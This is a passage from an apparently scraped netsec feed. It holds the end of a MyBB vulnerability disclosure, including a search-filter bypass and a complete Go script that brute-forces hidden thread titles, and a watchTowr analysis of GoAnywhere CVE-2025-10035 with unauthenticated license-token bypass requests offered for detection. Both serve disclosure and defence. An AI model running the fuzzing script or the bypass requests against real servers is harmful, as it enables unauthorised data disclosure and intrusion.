MATCH(message) AGAINST('\"\n  .$db-&gt;escape_string($keywords).\"' IN BOOLEAN MODE)\";\n$subject_lookin = \"AND MATCH(subject) AGAINST('\"\n  .$db-&gt;escape_string($keywords).\"' IN BOOLEAN MODE)\";\n--------------------------------------------------------------------------\nIt is seen that there are 2 main options to MATCH AGAINST, message or\nsubject. But before going into this, we have to understand how keywords are\npassed.\n\nFirstly, `perform_search_mysql_ft` takes the keyword and passes it into the\n`clean_keywords_ft` function\n--------------------------------------------------------------------------\n/inc/functions_search.php\n\nfunction perform_search_mysql_ft($search)\n{\n    global $mybb, $db, $lang;\n\n    $keywords = clean_keywords_ft($search['keywords']);\n--------------------------------------------------------------------------\n\n----[ 4.2 - Perfect Match Against Sanitization\nSo I am searching for \"jack*\". My \"jack*\" transformed into \"jack\"; to\nunderstand the reason, let's check the `clean_keywords_ft` function itself.\nIn basic regex:\n------------------\n(\\b.{1,2})(\\s)|(\\b.{1,2}$)\n------------------\nAs you can see, it has \\b (word boundary) which exists in these positions:\n* Between a \"word character\" and a \"non-word character\" (which is anything\n  not \\w, like *, (, +, space, etc.).\n* Between a \"non-word character\" and a \"word character\".\n* At the beginning of the string if the first character is a \\w.\n* At the end of the string if the last character is a \\w.\nBecause of the first reason, the asterisk gets replaced.\n\nTo bypass it, I can simply add \"ZZ\" at the end. Because .{1,2}$ matches the\nlast 1 or 2 characters. And now that the string is \"jack*ZZ\", the \"*ZZ\" part\nis between a \"non-word character\"(*) and a \"word character\" (ZZ). So the\nword character (ZZ) gets replaced and \"jack*ZZ\" becomes \"jack*\".\n\nAfter the `clean_keywords_ft` function, our keyword will be passed inside:\n--------------------------------------------------------------------------\n/inc/functions_search.php\n\n$word = str_replace(array(\"+\", \"-\", \"*\"), '', $word);\n--------------------------------------------------------------------------\n\nSo our asterisk gets replaced again. Now to bypass it I will use 2 keywords;\nthe first keyword will be \"&amp;&amp;&amp;&amp;&amp;\". There is no special reason for that, I\njust need an extra keyword which will be ignored by MATCH AGAINST.\n--------------------------------------------------------------------------\nmysql&gt; SELECT t.tid, t.firstpost FROM mybb_threads t WHERE 1=1 AND\n    -&gt; MATCH(subject) AGAINST('+&amp;&amp;&amp;&amp;&amp; +jack*' IN BOOLEAN MODE);\n+-----+-----------+\n| tid | firstpost |\n+-----+-----------+\n|   2 |         2 |\n+-----+-----------+\n1 row in set (0.00 sec)\n--------------------------------------------------------------------------\n\nThis one seems to be working. So I am passing &amp;&amp;&amp;&amp;&amp; +jack*ZZ as input so\nthat it would be converted into +&amp;&amp;&amp;&amp;&amp; +jack*. The second asterisk won't get\nremoved, and here is the reason:\n--------------------------------------------------------------------------\n/inc/functions_search.php\n\nfunction perform_search_mysql_ft($search)\n{\n    global $mybb, $db, $lang;\n    $keywords = clean_keywords_ft($search['keywords']);\n    if($mybb-&gt;settings['minsearchword'] &lt; 1)\n    {\n        $mybb-&gt;settings['minsearchword'] = 4;\n    }\n    $message_lookin = $subject_lookin = '';\n    if($keywords)\n    {\n        $keywords_exp = explode(\"\\\"\", $keywords);\n        $inquote = false;\n        foreach($keywords_exp as $phrase)\n        {\n            if(!$inquote)\n            {\n                $split_words = preg_split(\"#\\s{1,}#\", $phrase, -1);\n                foreach($split_words as $word)\n                {\n                    $word = str_replace(array(\"+\", \"-\", \"*\"), '', $word);\n                    if(!$word)\n                    {\n                        continue;\n                    }\n                    if(my_strlen($word) &lt; $mybb-&gt;settings['minsearchword'])\n                    {\n                        $all_too_short = true;\n                    }\n                    else\n                    {\n                        $all_too_short = false;\n                        break;\n                    }\n                }\n            }\n--------------------------------------------------------------------------\nThe `split_words` array will be: `0=&gt;\"+&amp;&amp;&amp;&amp;&amp;\"`, `1=&gt; \"+jack*\"`. The\n`foreach` loop will process \"+&amp;&amp;&amp;&amp;&amp;\" first and it will become \"&amp;&amp;&amp;&amp;&amp;\".\nBecause '+', '-', and '*' get replaced with nothing. Then, if the length of\n\"&amp;&amp;&amp;&amp;&amp;\" is less than `minsearchword` (which is 4 and was set inside\n`perform_search_mysql_ft`), it will continue the `foreach` loop; otherwise,\nit will set `all_too_short` to false and break the `foreach` loop. In our\ncase, the length is 5, and it breaks the `foreach` loop, because of which\nour second word, \"+jack*\", won't even get replaced. Later, it will be passed\ninto MATCH AGAINST\n\n----[ 4.3 - Exploiting\nThe query, as you can see, has a response showing the tid and firstpost. The\nreason why this works for the title and not for the content is because of\n\"p.visible = 1\" and \"t.visible = 1\", but we will come to that later.\n--------------------------------------------------------------------------\n/inc/functions_search.php\n\n    else\n    {\n        $query = $db-&gt;query(\"\n            SELECT t.tid, t.firstpost\n            FROM \".TABLE_PREFIX.\"threads t\n            WHERE 1=1 {$thread_datecut} {$thread_replycut}\n              {$thread_prefixcut} {$forumin} {$thread_usersql} {$permsql}\n              {$visiblesql} {$subject_lookin}\n            {$limitsql}\n        \");\n        while($thread = $db-&gt;fetch_array($query))\n        {\n            $threads[$thread['tid']] = $thread['tid'];\n            if($thread['firstpost'])\n            {\n                $firstposts[$thread['tid']] = $thread['firstpost'];\n            }\n        }\n        if(count($threads) &lt; 1)\n        {\n            error($lang-&gt;error_nosearchresults);\n        }\n        $threads = implode(',', $threads);\n        $firstposts = implode(',', $firstposts);\n        if($firstposts)\n        {\n            $query = $db-&gt;simple_select(\"posts\", \"pid\", \"pid IN\n              ($firstposts) {$plain_post_visiblesql} {$limitsql}\");\n            while($post = $db-&gt;fetch_array($query))\n            {\n                $posts[$post['pid']] = $post['pid'];\n            }\n            $posts = implode(',', $posts);\n        }\n    }\n    return array(\n        \"threads\" =&gt; $threads,\n        \"posts\" =&gt; $posts,\n        \"querycache\" =&gt; ''\n    );\n--------------------------------------------------------------------------\nQuery in DB:\n--------------------------------------------------------------------------\nmysql&gt; SELECT t.tid, t.firstpost FROM mybb_threads t WHERE 1=1 AND\n    -&gt; MATCH(subject) AGAINST('+&amp;&amp;&amp;&amp;&amp; +jack*' IN BOOLEAN MODE);\n+-----+-----------+\n| tid | firstpost |\n+-----+-----------+\n|   2 |         2 |\n+-----+-----------+\n1 row in set (0.00 sec)\n--------------------------------------------------------------------------\nNow the MOST important part here is\n--------------------------------------------------------------------------\n/inc/functions_search.php\n\n        if(count($threads) &lt; 1)\n        {\n            error($lang-&gt;error_nosearchresults);\n        }\n--------------------------------------------------------------------------\nIf the response has no result, it will open \"error_nosearchresults\";\notherwise, it will REDIRECT. This is why it is possible to identify title\nname, without seeing it. If I get a redirect when using \"jack*\", it means\nthat there is a title that starts with \"jack\", otherwise it would directly\nopen \"error_nosearchresults\". Now inside upload/search.php, we see this\nline, which shows where we get redirected. The thing is, we wouldn't have\nbeen able to reach this line if the response from MySQL had been empty.\n----------------------------------\n/upload/search.php\n\nredirect(\"search.php?action=results&amp;sid=\".$sid.\"&amp;sortby=\".$sortby.\"&amp;order=\"\n  .$sortorder, $lang-&gt;redirect_searchresults);\n----------------------------------\n\nIt is possible to exploit this vulnerability by fuzzing. The logic here is:\nI start with a*, then aa*, ab*, ac*, and so on. In a real-world scenario,\nan attacker would have multiple accounts, or proxies. In the test\nenvironment I just put \"Search Flood Time (seconds)\" to 0. Basic script:\n\n--------------------------------------------------------------------------\npackage main\n\nimport (\n    \"fmt\"\n    \"io\"\n    \"net/http\"\n    \"os\"\n    \"strings\"\n)\n\nconst fuzzChars = \"abcdefghijklmnopqrstuvwxyz0123456789\"\nconst queryTemplate = \"search.php?action=do_search&amp;keywords=%26%26%26%26%26\"\n  + \"+%2B{FUZZ}*xD&amp;postthread=2&amp;author=&amp;matchusername=1&amp;forums%5B%5D=all\"\n  + \"&amp;findthreadst=1&amp;numreplies=&amp;postdate=0&amp;pddir=1&amp;sortby=lastpost\"\n  + \"&amp;sortordr=desc&amp;showresults=threads&amp;submit=Search\"\nconst successIndicator = \"end: redirect\"\nconst maxFuzzPayloadLength = 50\n\nfunc min(a, b int) int {\n    if a &lt; b {\n        return a\n    }\n    return b\n}\n\nfunc main() {\n    if len(os.Args) &lt; 2 {\n        fmt.Fprintln(os.Stderr, \"Usage: go run test.go &lt;base_url&gt;\")\n        fmt.Fprintln(os.Stderr, \"Example: go run test.go http://127.0.0.1\")\n        os.Exit(1)\n    }\n    baseURL := strings.TrimSuffix(os.Args[1], \"/\")\n\n    fmt.Printf(\"Target base URL: %s\\n\", baseURL)\n    fmt.Printf(\"Fuzzing characters: %s\\n\", fuzzChars)\n    fmt.Printf(\"Max fuzz payload length: %d\\n\", maxFuzzPayloadLength)\n    fmt.Println(\"---\")\n\n    client := &amp;http.Client{\n        CheckRedirect: func(req *http.Request, via []*http.Request) error {\n            return nil\n        },\n    }\n\n    var allFoundSuccessfulPayloads []string\n    var payloadsToTestThisRound []string\n\n    for _, charRune := range fuzzChars {\n        payloadsToTestThisRound = append(payloadsToTestThisRound,\n          string(charRune))\n    }\n\n    for currentLength := 1; currentLength &lt;= maxFuzzPayloadLength;\n      currentLength++ {\n        if len(payloadsToTestThisRound) == 0 {\n            fmt.Printf(\"No more payloads to test. Stopping as no payloads\" +\n              \" generated for length %d.\\n\", currentLength)\n            break\n        }\n\n        fmt.Printf(\"--- Testing payloads of length %d (found %d to test)\" +\n          \" ---\\n\", currentLength, len(payloadsToTestThisRound))\n        var successfulPayloadsFoundThisRound []string\n\n        for _, fuzzPayload := range payloadsToTestThisRound {\n            fuzzedQuery := strings.Replace(queryTemplate, \"{FUZZ}\",\n              fuzzPayload, 1)\n            fullURL := baseURL + \"/\" + fuzzedQuery\n           \n            urlToPrint := fullURL\n            if len(urlToPrint) &gt; 120 {\n                urlToPrint = urlToPrint[:117] + \"...\"\n            }\n            fmt.Printf(\"Testing payload: '%s' (URL: %s)\\n\", fuzzPayload,\n              urlToPrint)\n\n            req, err := http.NewRequest(\"GET\", fullURL, nil)\n            if err != nil {\n                fmt.Fprintf(os.Stderr, \"  Error creating request for\" +\n                  \" payload '%s': %v\\n\", fuzzPayload, err)\n                continue\n            }\n\n            resp, err := client.Do(req)\n            if err != nil {\n                fmt.Fprintf(os.Stderr, \"  Error making GET request for\" +\n                  \" payload '%s': %v\\n\", fuzzPayload, err)\n                continue\n            }\n\n            bodyBytes, err := io.ReadAll(resp.Body)\n            resp.Body.Close()\n            if err != nil {\n                fmt.Fprintf(os.Stderr, \"  Error reading response body for\" +\n                  \" payload '%s': %v\\n\", fuzzPayload, err)\n                continue\n            }\n\n            bodyString := string(bodyBytes)\n            if strings.Contains(bodyString, successIndicator) {\n                fmt.Printf(\"  SUCCESS! Payload: '%s' (Status: %s).\" +\n                  \" Response contains '%s'.\\n\", fuzzPayload, resp.Status,\n                  successIndicator)\n                allFoundSuccessfulPayloads = append(allFoundSuccessfulPayloads,\n                  fuzzPayload)\n                successfulPayloadsFoundThisRound =\n                  append(successfulPayloadsFoundThisRound, fuzzPayload)\n            }\n        }\n\n        if currentLength &lt; maxFuzzPayloadLength {\n            if len(successfulPayloadsFoundThisRound) == 0 {\n                fmt.Printf(\"No successful payloads found at length %d.\" +\n                  \" Stopping further iterations.\\n\", currentLength)\n                payloadsToTestThisRound = []string{}\n            } else {\n                var nextPayloads []string\n                for _, prefix := range successfulPayloadsFoundThisRound {\n                    for _, charRune := range fuzzChars {\n                        nextPayloads = append(nextPayloads,\n                          prefix+string(charRune))\n                    }\n                }\n                payloadsToTestThisRound = nextPayloads\n                if len(payloadsToTestThisRound) == 0 &amp;&amp;\n                  len(successfulPayloadsFoundThisRound) &gt; 0 {\n                    fmt.Println(\"Warning: Generated empty next set of\" +\n                      \" payloads despite successes in current round. This\" +\n                      \" might happen if fuzzChars is empty. Stopping.\")\n                    break\n                }\n            }\n        } else {\n            fmt.Printf(\"Reached max payload length of %d.\\n\",\n              maxFuzzPayloadLength)\n        }\n    }\n\n    fmt.Println(\"--- Fuzzing Complete ---\")\n    if len(allFoundSuccessfulPayloads) &gt; 0 {\n        fmt.Printf(\"Found %d successful payload(s) in total:\\n\",\n          len(allFoundSuccessfulPayloads))\n        for _, p := range allFoundSuccessfulPayloads {\n            fmt.Printf(\"  - %s\\n\", p)\n        }\n    } else {\n        fmt.Println(\"No successful payloads found.\")\n    }\n}\n--------------------------------------------------------------------------\n\n--[ 5 - Acknowledgements\nThanks to the MyBB team, especially to Devilshakerz for the fast\nremediation!\n\n--[ 6 - References\n[ 0 ] https://en.wikipedia.org/wiki/Regular_expression\n[ 1 ] https://en.wikipedia.org/wiki/Wildcard_character\n[ 2 ] https://owasp.org/www-community/attacks/Regular_expression\n_Denial_of_Service_-_ReDoS\n[ 3 ] https://www.imperva.com/learn/ddos/regular-expression-denial-of-\nservice-redos/\n[ 4 ] https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/\nRegular_expressions\n[ 5 ] https://dev.mysql.com/doc/refman/8.4/en/regexp.html\n[ 6 ] https://en.wikipedia.org/wiki/Full-text_search\n[ 7 ] https://dev.mysql.com/doc/refman/8.4/en/fulltext-boolean.html\n[ 8 ] https://dev.mysql.com/doc/refman/8.4/en/fulltext-search.html\n[ 9 ] https://github.com/mybb\n</code></pre></section>","contentLength":29725,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1npo7vj/redisclosure_new_technique_for_exploiting/"},{"title":"New macOS threat abuses ads and social media to spread malware","url":"https://moonlock.com/new-iphones-anti-spyware","date":1758721159,"author":"/u/Individual-Gas5276","guid":87020,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1npcera/new_macos_threat_abuses_ads_and_social_media_to/"},{"title":"Is This Bad? This Feels Bad. (GoAnywhere CVE-2025-10035) - watchTowr Labs","url":"https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/","date":1758719050,"author":"/u/dx7r__","guid":87019,"unread":true,"content":"<p>File transfer used to be simple fun - fire up your favourite FTP client, log in to a glFTPd site, and you were done.</p><p>Fast forward to 2025, and the same act requires a procurement team, a web interface, and a vendor proudly waving their  pledge. </p><p>Ever seen the glFTPd developers on the list of pledge signers? Exactly.</p><p>Welcome back to another watchTowr Labs analysis. This time, we are dissecting , a perfect CVSS 10.0 vulnerability in Fortra’s GoAnywhere MFT.</p><p>For the uninitiated, GoAnywhere is a \"secure\" managed file transfer solution that automates and protects data exchange across enterprises, trading partners, and critical applications. </p><p>Not your friend's photo-sharing setup. We are talking Fortune 500 deployments, with over 20,000 instances exposed to the Internet. A playground APT groups dream about.</p><p>GoAnywhere has a history. In 2023, the cl0p ransomware gang turned CVE-2023-0669, a pre-auth command injection in the Licensing Response Servlet, into widespread compromise. That was the year of MFT exploitation trauma across multiple vendors, burned into the memory of defenders everywhere.</p><p>As always, and you'll read, we have an inner feeling (call it \"instinct\") that there is more to this vulnerability that we are not yet being told.</p><p>On Thursday, September 18, Fortra published a <a href=\"https://www.fortra.com/security/advisories/product-security/fi-2025-012?ref=labs.watchtowr.com\">security advisory fi-2025-012</a> titled: <strong>Deserialization Vulnerability in GoAnywhere MFT's License Servlet</strong>.</p><p>The title in itself is reason for alarm, with the description going further to explain how we likely got to a CVSS 10.0:</p><blockquote>A deserialization vulnerability in the License Servlet of Fortra's GoAnywhere MFT allows an actor with a validly forged license response signature to deserialize an arbitrary actor-controlled object, possibly leading to command injection.</blockquote><p>For those that recall the excitement of CVE-2023-0669, this description might feel.. familiar..:</p><blockquote>GoAnywhere MFT suffers from a pre-authentication command injection vulnerability in the License Response Servlet due to deserializing an arbitrary attacker-controlled object</blockquote><p>But watchTowr, how did this get a CVSS 10.0? The advisory clearly states meaningful hurdles for attackers to traverse:</p><blockquote>Exploitation of this vulnerability is highly dependent upon systems being externally exposed to the Internet.</blockquote><p>Fortra, should the advisory also note that the solution needs to be running?</p><h3>In The Wild Exploitation?</h3><p>As always, we must all play a game.</p><p>The above sometimes happens when a vendor updates references attached to a CVE. In this case, FI-2025-011 was deleted, and FI-2025-012 was added to replace it.</p><p>In FI-2025-012, a section was appended - an innocent \"Am I Impacted?\" section.</p><p>Typically (not always...), when a vulnerability receives in-the-wild exploitation, clarity to customers is provided to help inform prioritisation and remediation process expectations.</p><p>Fortra's advisory never says, “We’ve seen this exploited in-the-wild.” </p><p>What they do say is more curious: check your Admin Audit logs, look for  in exception traces, and if you see it, you were “likely affected.”</p><p>Affected, as in, vulnerable? Or affected like, the fox is already in the hen-house?</p><p>To determine if you're \"affected\", Fortra provides an IoC (Indicator of ) for this ambiguous-state vulnerability. </p><p>As discussed above, the advisory for FI-2025-012 includes a stack trace which will appear in your logs should you be \"affected\" by this vulnerability:</p><pre><code>ERROR Error parsing license response\njava.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException\n...\nat java.base/java.io.ObjectInputStream.readObject(Unknown Source)\nat java.base/java.security.SignedObject.getObject(Unknown Source)\nat com.linoma.license.gen2.BundleWorker.verify(BundleWorker.java:319)\nat com.linoma.license.gen2.BundleWorker.unbundle(BundleWorker.java:122)\nat com.linoma.license.gen2.LicenseController.getResponse(LicenseController.java:441)\nat com.linoma.license.gen2.LicenseAPI.getResponse(LicenseAPI.java:304)\nat com.linoma.ga.ui.admin.servlet.LicenseResponseServlet.doPost(LicenseResponseServlet.java:64)\n</code></pre><p>We know Fortra wouldn't be ambiguous on purpose, though, because CISA's Secure By Design pledge, which Fortra signed up to, talks about transparency around ITW exploitation:</p><h3>Part 1 - License Servlet “Authentication” Bypass</h3><p>The initial vendor advisory was clear, immediately pointing to the culprit: the License Servlet. Key points from the advisory:</p><ul><li>The License Servlet contains an insecure deserialization vulnerability.</li><li>According to the CVSS score, it’s reachable without authentication.</li></ul><p>So, first things first: can we actually hit the servlet and trigger the deserialization routine without credentials? To answer that, we need to crack open the code.</p><p>The License Servlet lives in <code>com.linoma.ga.ui.admin.servlet.LicenseResponseServlet</code> and is exposed at:</p><pre><code>/goanywhere/lic/accept/&lt;GUID&gt;</code></pre><p>Let’s take a look at the entry point:</p><pre><code>public void doPost(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException {\n    String var3 = var1.getParameter(\"bundle\"); // [1]\n    String[] var4 = var1.getRequestURI().split(\"/\"); // [2]\n    String var5 = var4[var4.length - 1];\n    Object var6 = null;\n    if (!SessionUtilities.isLicenseRequestTokenValid(var5, var1.getSession())) { // [3]\n        LOGGER.error(\"Unauthorized bundle from invalid session: \" + var3);\n        var2.sendError(400);\n        var1.getSession().removeAttribute(SessionAttributes.LICENSE_REQUEST_TOKEN.getAttributeKey());\n    } else {\n        try {\n            var9 = LicenseAPI.getResponse(var3); // [4]\n        } catch (Exception var8) {\n            LOGGER.error(\"Error parsing license response\", var8);\n            var2.sendError(500);\n            var1.getSession().removeAttribute(SessionAttributes.LICENSE_REQUEST_TOKEN.getAttributeKey());\n            return;\n        }\n    //...\n }\n</code></pre><ul><li>At  the servlet retrieves the  parameter from the HTTP request.</li><li>At  it extracts a string from our URL - a GUID that defines the license request token.</li><li>At  it calls <code>SessionUtilities.isLicenseRequestTokenValid</code> to validate the user-supplied license request token.</li><li>If the check at  passes, the servlet calls  with the  parameter.</li></ul><p>So, how does token validation (the GUID) actually work? Well...</p><ul><li>The servlet takes the GUID token extracted at .</li><li>It compares that token to the token that was stored on the user’s session.</li><li>If both tokens match, the validation at  succeeds and execution proceeds to .</li><li>If the tokens do not match, the flow stops - we never reach the deserialization code.</li></ul><p>So: without a valid token tied to the user session, we cannot even begin to reach the vulnerable deserialization routine.</p><h3>OK, We Need A Token - But How?</h3><p>Well, if your target GoAnywhere MFT instance has no license applied, this is trivial - you can head straight to the endpoint that starts the activation procedure, and a valid token will be applied to your session.</p><p>However, this is not a production reality where licenses are inevitably provided - and this is not as simple. Typically, in such a case, you need to be authenticated to generate a valid license request token and attach it to your session.</p><p>Our vulnerability is a perfect 10 CVSS, though, so logically there must be a way to obtain this token without any authentication. </p><p>All of our analysis led us to the <code>/goanywhere/license/Unlicensed.xhtml</code> endpoint, where we discovered a few important items:</p><ul><li>We can bypass authentication requirements for this endpoint by appending  (or any other invalid data) to the endpoint, like so: <code>/goanywhere/license/Unlicensed.xhtml/x</code> .</li><li>We need this endpoint to trigger an exception - for example, by providing an invalid , like this: <code>/goanywhere/license/Unlicensed.xhtml/x?javax.faces.ViewState=x&amp;GARequestAction=activate</code></li></ul><p>Why, you ask? Because, in doing so, the application then flows to the  servlet, where all of our fun begins:</p><pre><code>protected void doGet(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException {\n    Integer var3 = (Integer)var1.getAttribute(\"javax.servlet.error.status_code\");\n    String var4 = (String)var1.getAttribute(\"javax.servlet.error.message\");\n    Class var5 = (Class)var1.getAttribute(\"javax.servlet.error.exception_type\");\n    String var6 = (String)var1.getAttribute(\"javax.servlet.error.request_uri\");\n    Throwable var7 = (Throwable)var1.getAttribute(\"javax.servlet.error.exception\");\n    String var8 = var1.getRemoteAddr();\n    String var9 = var1.getParameter(\"GARequestAction\");\n    if (var3 == null &amp;&amp; var5 == null &amp;&amp; var7 == null) {\n        var2.sendError(404);\n    } else if (!this.bypassHandling(var3, var6)) {\n        if (var6.startsWith(var1.getContextPath() + \"/license/Unlicensed.xhtml\")) { // [1]\n            if (StringUtilities.isNotEmpty(var9) &amp;&amp; var9.equalsIgnoreCase(\"activate\")) {\n                String var14 = SessionUtilities.generateLicenseRequestToken(var1.getSession()); // [2]\n\n                try {\n                        LicenseUtilities.requestOnlineActivation(var1, var2, var14); // [3]\n                        return;\n                    } catch (Exception var13) {\n                        this.LOGGER.error(var13.getMessage(), var13);\n                    }\n                }\n\n                var2.sendRedirect(var6);\n                //...\n}\n</code></pre><ul><li>At , the code checks whether the request URL begins with <code>/license/Unlicensed.xhtml</code>.</li><li>If it does, then at  the application generates a valid license-request token and attaches it to the session.</li><li>Finally, at , the token is passed to <code>LicenseUtilities.requestOnlineActivation</code>. </li><li>This method builds a redirect URL to the GoAnywhere license server, embedding the signed license request inside an HTTP GET  parameter.</li></ul><p>Now, for anyone who doesn’t live and breathe GoAnywhere MFT’s licensing process, the license request does two key things:</p><ul><li>It stores a serialized Java object containing the license-request token.</li><li>It’s encrypted with hard-coded keys (and partially compressed for good measure).</li></ul><p>An attacker can simply send:</p><pre><code>GET /goanywhere/license/Unlicensed.xhtml/watchTowr?javax.faces.ViewState=watchTowr&amp;GARequestAction=activate HTTP/1.1\nHost: {{Hostname}}\n</code></pre><p>In response, the server redirects and returns a  parameter (the license request) — plus a cookie where the generated token has been attached.</p><pre><code>HTTP/1.1 302 \n...\nLocation: &lt;https://my.goanywhere.com:443/lic/request?bundle=p55wfyVKXDVM_bAVZtDLOg3PglFmtEOHyjm4vYZ9l2kwhyouIP6ieq_VZ6lJbVsf5J7KHr..... snip .....\n</code></pre><p>Because the encryption key is hard-coded, the  parameter value can be decrypted offline to recover the embedded GUID. </p><p>Using said GUID, we are then able to interact with the License Servlet without \"actually\" authenticating:</p><pre><code>POST /goanywhere/lic/accept/d1a8b697-d68c-4e7d-b179-5f3b8b529e6f HTTP/1.1\nHost: {{Hostname}}\nCookie: ASESSIONID=F970BB906F5F7D325BFC6E261CF87AE6;\nContent-Type: application/x-www-form-urlencoded\n\nbundle=inputhere\n</code></pre><p>There we have it - the \"Authentication Bypass\" portion of this vulnerability. Let's move on...</p><h3>Part 2 - Insecure Deserialization in License Servlet</h3><p>Now that we can obtain the GUID token unauthenticated, we can reach the deserialization sink that this vulnerability ends with.</p><p>For your sake, and our sanity, we are going to skip the majority of the code and leave you with two basic facts you need to know:</p><ul><li>The  parameter carries a serialized Java object that the server decrypts during processing.</li><li>Decryption uses hard-coded keys, so the  parameter value is recoverable offline.</li><li>Processing eventually reaches <code>com.linoma.license.gen2.BundleWorker.verify</code>, where the application hands us the raw input byte array derived from the .</li><li>In short, an attacker-controlled serialized object reaches server-side deserialization logic.</li></ul><p>Let's step through <code>com.linoma.license.gen2.BundleWorker.verify</code>:</p><pre><code>private static byte[] verify(byte[] var0, KeyConfig var1) throws IOException, ClassNotFoundException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, UnrecoverableKeyException, CertificateException, KeyStoreException {\n    String var2 = \"SHA1withDSA\";\n    if (\"2\".equals(var1.getVersion())) {\n        var2 = \"SHA512withRSA\";\n    }\n\n    PublicKey var3 = getPublicKey(var1);\n    Signature var4 = Signature.getInstance(var2);\n    SignedObject var5 = (SignedObject)JavaSerializationUtilities.deserialize(var0, SignedObject.class, new Class[]{byte[].class}); // [1]\n    if (var1.isServer()) {\n        return ((SignedContainer)JavaSerializationUtilities.deserializeUntrustedSignedObject(var5, SignedContainer.class, new Class[]{byte[].class})).getData();\n    } else {\n        boolean var6 = var5.verify(var3, var4); // [2]\n        if (!var6) {\n            throw new IOException(\"Unable to verify signature!\");\n        } else {\n            SignedContainer var7 = (SignedContainer)var5.getObject(); // [3]\n            return var7.getData();\n        }\n    }\n}\n</code></pre><p>This part can be a little confusing, so let’s stick to the key points.</p><p>At  the code calls into a hardened deserialization wrapper (wrapping around <code>ValidatingObjectInputStream.readObject</code> from standard Apache libraries), to deserialize our data.</p><p>It also supplies extra arguments, such as , which define the only types the routine will accept during deserialization.</p><p>Those additional arguments restrict what types can be deserialized. In practice, this means the routine will only accept a <code>java.security.SignedObject</code> or a raw .</p><p>So what is a ? According to the Java documentation:</p><blockquote>SignedObject is a class for the purpose of creating authentic runtime objects whose integrity cannot be compromised without being detected.<p>More specifically, a SignedObject contains another Serializable object, the (to-be-)signed object and its signature.</p></blockquote><p>In simple terms, a  is just a wrapper. It stores a serialized object inside and a signature calculated over that stream with a private key alongside it.</p><p>The class also provides a few helper methods:</p><ul><li> - uses the public key to check that the signature matches.</li><li> - deserializes and returns the inner serialized object.</li></ul><p>At , the code will call  on our deserialized , immediately allowing an attacker to:</p><ul><li>Deliver a serialized .</li><li>Which internally stores a malicious serialized object, like a one based on the  gadget.</li><li>GoAnywhere will deserialize this inner object, and that’s it.</li></ul><p>Do you see what we missed? Look at .</p><p>The code checks the signature of our serialized object against a public key baked into GoAnywhere. On paper, this is sensible. Signature validation is handled by Bouncy Castle and its FIPS API.</p><p>So the final barrier to a pre-auth RCE is bypassing that signature check. But here’s the problem: <strong>we don’t know how. Really.</strong></p><p>Either we are missing a trick, or the check is genuinely solid. We tried:</p><ul><li>Using several private keys shipped in GoAnywhere to generate a valid signature. None of them matched the public key in play.</li><li>Reviewing the Java code responsible for the signature verification.</li><li>Chasing alternative code paths that might hit deserialization without needing this check.</li></ul><p>One might think: just diff the patch, you dummies.</p><p>Here’s the kicker though. The patch  harden the deserialization routine, but the signature verification logic? Completely untouched.</p><p>The patch doesn’t amend the signature check at all. Instead, it only changes the deserialization flow, replacing  with a custom wrapper called <code>deserializeUntrustedSignedObject</code>. The idea seems to be to add another layer of “safety” around deserialization.</p><p>We’ve got a few conspiracy theories, though,<strong> all of which we have absolutely zero evidence for, and are complete conjecture. </strong>Regardless,you’re free to pick whichever one fits your mood:</p><ul><li> We somehow missed an obvious bypass for the signature verification routine. If that’s the case, why didn’t the patch touch it? </li><li> The private key leaked. Dramatic, yes, but possible. That would let attackers sign malicious objects that every GoAnywhere instance on the planet would happily accept.</li><li><strong>The vendor accidentally signed evil.</strong> Imagine this:<ul><li>When you activate your GoAnywhere product, your installation generates a serialized license request.</li><li>It’s sent to the vendor’s license server ()</li><li>If someone slipped a malicious object inside that request and the vendor blindly signed it, attackers would now have a perfectly valid signed payload that works everywhere.</li></ul></li></ul><p>Fueling our conspiracy theories was the advisory deletion and reference update we discussed above, including a stack trace which signals a valid exploitation attempt and asks the user to check their logs:</p><p>Who does that? Well, in our opinion, typically vendors whose products are facing ITW exploitation - but we're not experts.</p><p>It’s all a mystery. We can’t see a path to exploit this without a valid private key. On paper, that should kill the bug dead. </p><p>On the other hand, this has a perfect 10 CVSS score, and the vendor has published \"IoCs,\" which indicates that it is likely real.</p><p>And on the other hand, we recently saw a critical CVE in Sitecore that existed purely because… people were copy-pasting machine keys straight from the documentation. </p><p>At this point, nothing shocks us. CVE assignments feel less like a science and more like a game of darts in the dark.</p><h3>Detection Artefact Generator</h3><p>Across our client base, we used the Authentication Bypass weakness within an impact-less (but still exploitation-based) mechanism to identify unpatched and vulnerable GoAnywhere systems at scale. </p><p>Today, we're sharing this mechanism:</p><pre><code>GET /goanywhere/license/Unlicensed.xhtml/watchTowr?javax.faces.ViewState=watchTowr&amp;GARequestAction=activate HTTP/1.1\n</code></pre><p>If the instance is unpatched, you’ll see the response include a  header with a license request embedded in the  query string parameter:</p><p>If you don’t see the   parameter, your instance is patched. That’s because the  no longer generates a valid license request token once the fix is applied.</p><ul><li>: redirect to <code>/license/Unlicensed.xhtml</code> with a valid license request token attached.</li><li>: redirect to <code>/license/Unlicensed.xhtml</code> with  license request token.</li></ul><p>No mystery is complete without a few unanswered questions. Despite our usual routine of reverse engineering and creative detours, we’ve ended this one with more questions than usual.</p><p>Did we miss critical lines of code that makes everything click into place? Will the first reply on social media point out the obvious and send us a working PoC embedded in a meme? Please.</p><p>Because the alternatives are less comforting. </p><ul><li>Could this vulnerability already be in active use? </li><li>Could someone have access to a signed malicious object ready to be sprayed across the Internet or delivered with precision to a single target? </li><li>Could that be happening right now?</li></ul><p>One thing is certain: no vendor assigns a CVSS 10 to a purely theoretical bug. We'd advise against leaving GoAnywhere unpatched below 7.8.4 (or Sustain Release 7.6.3).</p><p>While this mystery continues to evolve, and we're excited to see if anyone takes the baton from us, concerned operators and end users can use our Detection Artefact Generator to check for externally vulnerable instances. </p><p>The research published by <a href=\"https://www.watchtowr.com/?ref=labs.watchtowr.com\">watchTowr Labs</a> is just a glimpse into what powers the <a href=\"https://www.watchtowr.com/?ref=labs.watchtowr.com\">watchTowr Platform</a> – 